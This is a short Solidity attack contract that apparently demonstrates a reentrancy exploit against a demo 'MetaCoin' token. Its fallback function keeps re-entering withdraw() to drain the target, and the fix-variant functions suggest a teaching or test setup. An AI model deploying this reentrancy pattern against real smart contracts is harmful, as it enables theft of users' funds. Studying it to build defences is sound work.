pragma solidity ^0.4.8;

import "./MetaCoin.sol";

contract MetaCoinEx {
  MetaCoin public metacoin;

  function MetaCoinEx (address _metacoin) public {
    metacoin = MetaCoin(_metacoin);
  }

  function bailOut () public {
    selfdestruct(msg.sender);
  }

  function withdraw() public payable {
    metacoin.deposit.value(msg.value)();
    metacoin.withdraw();
  }

  function withdrawFix1() public payable {
    metacoin.deposit.value(msg.value)();
    metacoin.withdrawFix1();
  }  

  function withdrawFix2() public payable {
    metacoin.deposit.value(msg.value)();
    metacoin.withdrawFix2();
  }    

  function () public payable {
    if (metacoin.balance >= msg.value) {
      metacoin.withdraw();
    }
  }
}
